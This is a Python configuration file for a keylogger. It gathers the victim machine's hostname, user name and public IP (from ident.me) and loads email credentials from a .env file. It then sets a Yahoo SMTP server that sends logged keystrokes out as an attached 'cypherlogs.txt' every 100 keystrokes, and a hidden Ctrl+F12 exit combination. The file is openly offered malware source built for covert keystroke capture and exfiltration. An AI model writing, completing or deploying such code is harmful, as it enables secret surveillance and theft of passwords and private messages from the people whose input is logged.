import os
import sys
import socket
import dotenv
import urllib
from pynput.keyboard import Key
from os.path import basename

HOSTNAME = socket.gethostname()
USER = os.getlogin()
FILE_NAME = basename(sys.argv[0].split("\\")[-1])
try:
    PUBLIC_IP = urllib.request.urlopen('https://ident.me').read().decode('utf8')
except:
    PUBLIC_IP = None

dotenv.load_dotenv(".env")

'''------------------------------- CONFIGURATION SETTINGS BELOW --------------------------------'''

SMTP_SERVER = "smtp.mail.yahoo.com"             # Specify SMTP server here.
TO_ADDR = os.environ["EMAIL"]                   # Get recipient email address from .env file.
FROM_ADDR = os.environ["EMAIL"]                 # Get sender email address from .env file.
PASSWORD = os.environ["PASSWORD"]               # Get email account password from .env file.
EMAIL_INTERVAL = 100                            # Emails are sent for every X amount of keystrokes. Enter 0 if you do not want periodic emails (Default is 100).
PORT = 465                                      # Specify port number here(465 reccomended).
EXIT_COMBINATION = {Key.ctrl_l, Key.f12}        # Press [L CTRL] + [F12] to stop keylogger.
SUBJECT = f"{USER}@{HOSTNAME} // {FILE_NAME}"   # Specify email subject here.
# Specify email body here.
CONTENT = '''                                   
See cypherlogs.txt attached.

Sent from {}.'''.format(PUBLIC_IP)



